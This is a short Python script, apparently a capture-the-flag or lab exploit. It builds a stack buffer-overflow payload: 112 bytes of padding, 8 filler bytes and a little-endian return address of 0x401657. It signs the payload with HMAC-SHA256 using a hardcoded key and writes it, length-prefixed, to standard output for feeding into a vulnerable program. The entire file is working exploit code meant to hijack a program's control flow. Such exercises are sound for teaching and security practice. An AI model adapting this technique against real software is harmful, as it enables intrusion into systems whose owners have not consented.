#!/usr/bin/env python3
import sys
import hmac, hashlib, struct

key = struct.pack('<QQQQ',
    0x7d07b7e9e975c8b8,
    0x6de694f4b4eee693,
    0xb11fb99c5b356e47,
    0xf1880340f565fda2
)

payload = b'A' * 112 + b'B' * 8 + b'\x57\x16\x40\x00\x00\x00\x00\x00'
size = len(payload)

mac = hmac.new(key, payload, hashlib.sha256).digest()


sys.stdout.buffer.write(struct.pack('<Q', size) + payload + mac)
